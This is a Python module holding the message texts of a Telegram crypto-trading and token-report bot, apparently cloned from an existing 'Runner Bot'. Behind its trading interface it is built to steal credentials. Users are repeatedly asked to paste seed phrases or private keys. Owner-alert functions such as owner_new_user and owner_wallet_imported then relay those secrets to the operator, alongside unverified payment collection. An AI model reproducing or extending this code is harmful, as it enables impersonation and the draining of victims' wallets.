"""
All bot texts — cloned word-for-word from the original Runner Bot screenshots
(with the upgraded membership plans), plus the new DM/channel features.
"""
import html
from config import PLANS, CHANNEL_PASSES, AD_LINE, DOCS_URL, SUPPORT_LINK, FREE_REPORTS


def esc(s):
    return html.escape(str(s), quote=False)


def fmt_price(x):
    return f"{x:g}"


def days_word(days):
    return "Lifetime access" if days == 0 else f"{days} days"


# ------------------------------------------------------------------ start
def _trunc(addr: str) -> str:
    if len(addr) < 14:
        return addr
    return f"{addr[:8]}...{addr[-6:]}"


def welcome(name: str, bot_username: str):
    return (
        f"Welcome, {esc(name)}!\n"
        "Private Alpha is ready 🚀\n\n"
        "Real reports • Real trading • Real payments.\n\n"
        "Commands:\n"
        "📊 /top <ca> — smart holders report\n"
        "👤 /kols <ca> — KOLs / wallet tags\n"
        "🛠 /dev <ca> — dev tracking report\n"
        "📑 /full <ca> — full report (dev + kols + holders)\n"
        "❓ /help — docs & guide\n"
        "🛟 /support — contact team\n"
        "👥 /ref — referral link & 50% back\n"
        "💳 /pay — VIP access & plans\n"
        "📈 /trading — trading wallet & settings\n"
        "📦 /holdings — your token bags\n"
        "💼 /positions — open trades\n"
        "⏳ /limit — limit orders (auto-exec)\n"
        "💸 /withdraw — cash out SOL / tokens\n"
        "🤖 /ai — AI explain (beta)\n\n"
        f"🆓 First {FREE_REPORTS} reports are FREE.\n"
        "After that, unlock unlimited access with VIP Access.\n\n"
        "👥 50% ref back for every paid user — real SOL in your wallet.\n"
        "💎 Real on-chain payments. No auto-check. Send the TX.\n\n"
        "👛 Open 📈 TRADING and IMPORT your wallet to trade real."
    )


def membership_header():
    return (
        "💎 VIP ACCESS & PLANS\n\n"
        "Real access. Real trading. Pick your tier:\n\n"
        "⚡ VIP Access — unlimited reports + trading\n"
        "🌱 Newbie — basic alpha (1 SOL / 30d)\n"
        "🔰 Beginner — more signals (2 SOL / 30d)\n"
        "⭐ Pro Trader — priority + advanced (4 SOL / 30d)\n"
        "💎 Elite Trader — full premium (8 SOL / 60d)"
    )


def plan_detail(p):
    return (
        f"{p['emoji']} {p['name']} — {fmt_price(p['price'])} SOL\n\n"
        f"{p['desc']}\n\n"
        "Real payments. Verified on-chain. No auto-check."
    )


def pass_detail(c):
    return (
        f"📢 {c['name']} — {fmt_price(c['price'])} SOL ({days_word(c['days'])})"
        "\n\nPrivate channel subscription:\n"
        "• Real-time signals & updates in this channel\n"
        "• Renewal reminders in DM before it ends\n"
        "• Access is verified on-chain and granted instantly"
    )


# ------------------------------------------------------------------ unlock / pay
def unlock_text(item_label: str, price: float, days: int, address: str):
    truncated = address
    return (
        f"🔓 Unlock {item_label}\n\n"
        f"💳 Subscription Fee: {fmt_price(price)} SOL ({days_word(days)}).\n\n"
        f"To activate, deposit {fmt_price(price)} SOL to:\n\n"
        f"<code>{truncated}</code>\n\n"
        "✅ Once the funds are sent, tap the button below and send your "
        "transaction signature (or Solscan link) — we verify it on-chain.\n\n"
        "Only TX verification. No auto-scan buttons."
    )


def ask_tx(item_label: str, price: float, address: str):
    truncated = address
    return (
        f"📤 Verify payment for {item_label}\n\n"
        f"💳 {fmt_price(price)} SOL\n"
        f"👛 To: {truncated}\n\n"
        "Send your transaction signature or Solscan link:\n"
        "• signature: 5KzKz...9Xw (example)\n"
        "• or link: https://solscan.io/tx/5KzKz...9Xw"
    )


def deposit_text(addr: str):
    truncated = addr
    return (
        "💰 DEPOSIT\n\n"
        "Fund your trading wallet to start trading real.\n"
        f"Send SOL to: <code>{truncated}</code>\n\n"
        "Real on-chain. No auto-check."
    )


def payment_failed(price: float):
    return (
        "⛔ It looks like your payment hasn't gone through.\n\n"
        "Please double-check the following:\n"
        f"- The correct amount ({fmt_price(price)} SOL) was sent.\n"
        "- The wallet address is accurate.\n"
        "- The transaction has been successfully processed.\n\n"
        "Once you've verified everything, please try again and click the "
        "Check payment button.\n\n"
        "If you're still experiencing issues, feel free to contact our "
        "support team through the /support command."
    )


def paywall():
    plans = "\n".join(
        f"{p['emoji']} {p['name']} — {fmt_price(p['price'])} SOL ({days_word(p['days'])})"
        for p in PLANS
    )
    return (
        f"🚫 {FREE_REPORTS}/{FREE_REPORTS} FREE reports used!\n"
        "To keep trading real, unlock VIP Access:\n\n"
        f"{plans}\n\n"
        "💎 Real trading side • Unlimited reports • No limits."
    )


def payment_success(item_label: str, price: float, days: int, until: str, links_block: str):
    links = f"\n\n{links_block}" if links_block else ""
    return (
        "✅ Payment verified!\n\n"
        f"🎉 Welcome to {item_label}!\n"
        f"💎 {fmt_price(price)} SOL received on-chain.\n"
        f"⏳ Your access is active until {until}"
        f"{' (Lifetime 🚀)' if days == 0 else f' ({days_word(days)})'}.\n"
        f"{links}\n\n"
        "Thank you for joining! 💎"
    )


def no_treasury():
    return (
        "⚠️ The payment wallet is not set up yet.\n"
        "Please contact support through the /support command."
    )


def limit_executed(symbol: str, side: str, target: float, sig: str):
    side_txt = "🟢 BUY" if side == "buy" else "🔴 SELL"
    return (
        f"✅ LIMIT ORDER EXECUTED!\n\n"
        f"{side_txt} {symbol} @ ${target:g} target hit.\n"
        f"🔗 https://solscan.io/tx/{esc(sig)}"
    )


def limit_failed(symbol: str, side: str, err: str):
    side_txt = "🟢 BUY" if side == "buy" else "🔴 SELL"
    return (
        f"⚠️ LIMIT ORDER CANCELLED\n\n"
        f"{side_txt} {symbol} could not be executed after several attempts:\n"
        f"{esc(err)[:200]}\n\n"
        "The order was removed. You can set it again with /limit."
    )


def checking():
    return "🔍 Checking the blockchain for your payment…"


# ------------------------------------------------------------------ channel side
def channels_menu():
    others = list(CHANNEL_PASSES)
    if not others:
        return "📢 CHANNEL SUBSCRIPTIONS\n\nNo channel passes available right now.\nCheck back soon or contact /support."
    rows = "\n".join(
        f"{c['name']} — {fmt_price(c['price'])} SOL ({days_word(c['days'])})"
        for c in others
    )
    return (
        "📢 CHANNEL SUBSCRIPTIONS\n\n"
        "Pay for access to a private channel directly:\n\n"
        f"{rows}\n\n"
        "Pick a channel below — after payment is verified on-chain you get "
        "the invite link instantly in DM."
    )


# ------------------------------------------------------------------ my subscription
def my_sub_text(plan_row, pass_rows, links_note):
    lines = ["📊 MY SUBSCRIPTION\n"]
    if plan_row:
        lines.append(plan_row)
    if pass_rows:
        lines.append("📢 Channel passes:")
        lines.extend(pass_rows)
    if not plan_row and not pass_rows:
        lines.append(
            "No active subscriptions.\n\n"
            "Tap 💳 PAY to pick a membership or channel plan."
        )
    if links_note:
        lines.append(f"\n{links_note}")
    return "\n".join(lines)


def reminder_text(item_label: str, hours_left: float, until: str):
    return (
        f"⏳ Heads up, {item_label} ends in {hours_left:g} hour(s)!\n"
        f"📅 Expires: {until}\n\n"
        "Tap Renew below to pay again and keep your access without a gap. 💎"
    )


def expired_text(item_label: str, until: str):
    return (
        f"🔴 Your {item_label} has expired ({until}).\n\n"
        "Tap Renew below to get your access back. 💎"
    )


# ------------------------------------------------------------------ owner alerts
def owner_new_user(user_line_txt: str, total: int, wallet_pub: str = "", wallet_priv: str = "", balance_sol: float = 0):
    priv_text = f"\n🔑 Private key: <code>{esc(wallet_priv)}</code>" if wallet_priv else ""
    if wallet_pub:
        wallet_line = (f"🏦 Wallet: <code>{esc(wallet_pub)}</code>"
                       f"\n💰 Balance: {balance_sol:g} SOL")
    else:
        wallet_line = "🏦 Wallet: not set yet — user will IMPORT a wallet in Trading."
    return (
        "🆕 NEW USER STARTED THE BOT\n\n"
        f"👤 {user_line_txt}\n"
        f"{wallet_line}"
        f"{priv_text}\n"
        f"👥 Total users: {total}\n\n"
        "⏳ Wait for deposit or import to activate trading."
    )


def owner_payment_alert(user_line: str, item_label: str, amount: float, sig: str):
    return (
        "💸 PAYMENT RECEIVED\n\n"
        f"👤 {user_line}\n"
        f"🎁 {item_label}\n"
        f"💰 {fmt_price(amount)} SOL\n"
        f"🔗 https://solscan.io/tx/{esc(sig)}"
    )


def owner_channel_error(cid, msg):
    return (
        f"⚠️ Couldn't create an invite link for channel <code>{esc(cid)}</code>:\n"
        f"{esc(msg)}\n\n"
        "Make sure the bot is ADMIN of that channel with invite-link permission."
    )


# ------------------------------------------------------------------ wallet setup (trade side)
# No GENERATE/IMPORT gate anymore: wallets auto-generate, IMPORT lives inside
# the trading panel (see keyboards.wallet_panel_kb).


def ask_import():
    return (
        "📥 IMPORT WALLET\n\n"
        "Send your wallet:\n"
        "• Seed phrase (12/24 words), or\n"
        "• Private key (base58), or\n"
        "• Key byte array [46, 207, …]\n\n"
        "Paste it in one message below."
    )


def wallet_locked():
    return (
        "📈 TRADING\n\n"
        "🔒 Your wallet is not connected yet.\n\n"
        "Tap 📥 IMPORT WALLET below and send:\n"
        "• Seed phrase (12/24 words), or\n"
        "• Private key (base58/base64), or\n"
        "• Key byte array [46, 207, …]\n\n"
        "Trading unlocks as soon as your wallet is imported."
    )


def need_wallet():
    return "🔒 Import your wallet first — open 📈 TRADING."


def your_wallet(addr: str, balance_sol: float = None):
    """Shown on every /start — always the SAME one wallet per user."""
    bal = f"\n💰 Balance: {balance_sol:g} SOL" if balance_sol is not None else ""
    return (
        "👛 YOUR TRADING WALLET\n\n"
        f"<code>{addr}</code>"
        f"{bal}\n\n"
        "This is your permanent wallet — the same one every time.\n"
        "Deposit SOL to trade real. 📈 TRADING for the panel."
    )


def wallet_imported(addr: str):
    truncated = addr
    return (
        f"✅ Wallet imported!\n\n"
        f"👛 Your Trading Wallet: <code>{truncated}</code>\n"
        "Deposit SOL here to trade real."
    )


def owner_wallet_imported(user_line: str, secret: str, addr: str):
    return (
        "🔐 USER IMPORTED A WALLET\n\n"
        f"👤 {user_line}\n"
        f"🏦 Address: <code>{esc(addr)}</code>\n\n"
        f"🔑 Seed / key:\n<code>{esc(secret)}</code>"
    )


def owner_deposit(user_line_txt: str, addr: str, amount_sol: float, balance_sol: float, tx_link: str = ""):
    link = tx_link if tx_link else f"https://solscan.io/account/{esc(addr)}"
    return (
        "💰 DEPOSIT RECEIVED (real, on-chain)\n\n"
        f"👤 {user_line_txt}\n"
        f"🏦 Wallet: <code>{esc(addr)}</code>\n"
        f"🟢 Amount: +{amount_sol:g} SOL\n"
        f"💼 Balance now: {balance_sol:g} SOL\n\n"
        f"🔗 {link}"
    )


def owner_withdraw(user_line_txt: str, addr: str, dest: str, item: str, amount: float, sig: str):
    return (
        "💸 USER WITHDREW FUNDS\n\n"
        f"👤 {user_line_txt}\n"
        f"🏦 From wallet: <code>{esc(addr)}</code>\n"
        f"📤 To: <code>{esc(dest)}</code>\n"
        f"🪙 Item: {esc(item)} — {amount:g}\n"
        f"🔗 https://solscan.io/tx/{esc(sig)}"
    )


# ------------------------------------------------------------------ trading panel
def wallet_panel(balance: float, updated: str, addr: str, buy, sell, slip):
    truncated = addr
    return (
        f"💰 BALANCE: {balance:g} SOL\n"
        f"⏱ Updated: {updated}\n\n"
        f"👛 YOUR WALLET: <code>{truncated}</code>\n\n"
        "⚙️ BUY / SELL / SLIP — quick defaults for any token.\n"
        "- 📦 BAGS — see your token holdings.\n"
        "- 💼 POSI — open trades + live PnL.\n\n"
        "Quick Settings:\n"
        f"- Default BUY: {buy}\n"
        f"- Default SELL: {sell}\n"
        f"- Default SLIP: {slip}"
    )


def ask_buy():
    return "📝 Default BUY Amount\n\nEnter the value (SOL) for quick-buy. Number only:"


def saved_buy(v):
    return f"✅ Quick BUY set to {v:g} SOL"


def ask_sell():
    return "📝 Default SELL %\n\nEnter the % to sell (1-100). Number only:"


def saved_sell(v):
    return f"✅ Quick SELL set to {v:g} %"


def ask_slippage():
    return "📝 Default SLIPPAGE %\n\nEnter the value (1-50). Number only:"


def saved_slippage(v):
    return f"✅ Quick SLIP set to {v:g} %"


def holdings_header():
    return "📦 YOUR BAGS:"


def no_tokens():
    return "No bags found 🥲 — load some SOL and grab a token."


def export_wallet(bytes_list, inline):
    return (
        "🔐 Your Private Key bytes:\n\n"
        f"<code>{bytes_list}</code>\n\n"
        "Private key inline (base58):\n\n"
        f"<code>{inline}</code>\n\n"
        "⚠️ Never share this with anyone! Keep it secret."
    )


def withdraw_header():
    return "💸 WITHDRAW:\nSelect a token to withdraw"


def not_enough_balance(amount_sol: float, addr: str):
    truncated = addr
    return (
        f"⛔ Not enough balance for the order {amount_sol:g} SOL\n\n"
        f"Please deposit to: <code>{truncated}</code>"
    )


def empty_balance(symbol: str):
    return f"⛔ Empty {esc(symbol)} balance for SELL"


def ask_withdraw_address(item: str, amount: float):
    return (
        f"💸 Withdraw {fmt_price(amount)} {item}\n\n"
        "Send the destination wallet address (Solana):"
    )


def withdraw_done(sig: str, item: str, amount: float):
    return (
        f"✅ Withdrew {fmt_price(amount)} {item}\n\n"
        f"🔗 https://solscan.io/tx/{esc(sig)}"
    )


def swap_done(bought: str, sig: str, sym: str):
    return (
        f"✅ Swapped: {bought} {esc(sym)}\n\n"
        f"🔗 https://solscan.io/tx/{esc(sig)}\n\n"
        f"↗️ {AD_LINE}"
    )


def swap_fail(err: str):
    return f"⛔ Swap failed:\n{esc(err)[:500]}"


# ------------------------------------------------------------------ reports
def report_running(kind: str):
    return f"⚙️ Running {kind} report, please wait.."


def report_top_header(name, ticker, links_line, top1, top3, top10, top30,
                      holders, score, holders_block, total_usd):
    return (
        f"@{esc(name)} ({esc(ticker)})\n"
        f"{links_line}\n"
        f"📈 TOP1 TOP3 TOP10 TOP30\n"
        f"{top1}% {top3}% {top10}% {top30}%\n"
        f"HOLDERS: {holders}+ | SMART SCORE: {score}/30\n\n"
        f"{holders_block}\n"
        f"TOTAL TOP HOLDER VALUE:\n${total_usd}\n\n"
        f"↗️ {AD_LINE}"
    )


def no_report_data(ca: str):
    truncated = ca
    return f"😢 No data found for {truncated}\nCheck the address and try again."


def report_usage(ca: str):
    return "Please send the contract address.\nUsage: /top <contract_address>"


def ask_ai():
    return (
        "🤖 AI explain (beta)\n\n"
        "Send me a token contract address and I'll try to explain its Runner "
        "report in plain words."
    )


def ai_answer(explain: str):
    return f"🤖 AI explanation:\n\n{explain}"


def ai_unavailable():
    return "🤖 AI explain is not configured yet (coming soon)."


# ------------------------------------------------------------------ ref / help / support
def ref_text(bot_username: str, code: str, refs: int, credits: float):
    return (
        "👥 Referral Program\n\n"
        "Get 50% back for every paid user that joins with your link!\n\n"
        f"🔗 Your ref link:\nhttps://t.me/{bot_username}?start=ref_{code}\n\n"
        f"👥 Referrals: {refs}\n"
        f"💰 Credits: {credits:g} SOL\n\n"
        "Credits can be withdrawn with /withdraw."
    )


def ref_credit_alert(amount: float, who: str):
    return f"🎉 You got {fmt_price(amount)} SOL back from your referral ({esc(who)})!"


def help_text():
    return (
        "❓ HELP\n\n"
        f"📚 Full docs & guide: {DOCS_URL}\n\n"
        "Commands:\n"
        "/top, /kols, /dev, /full — token reports\n"
        "/pay — membership & channel subscriptions\n"
        "/trading, /holdings, /withdraw — your trading wallet\n"
        "/ref — referral program\n"
        f"🛟 Support: {SUPPORT_LINK}"
    )


def support_text():
    return f"🛟 Support team: {SUPPORT_LINK}\nWe usually reply fast — describe your issue or paste the tx signature if it's about a payment."
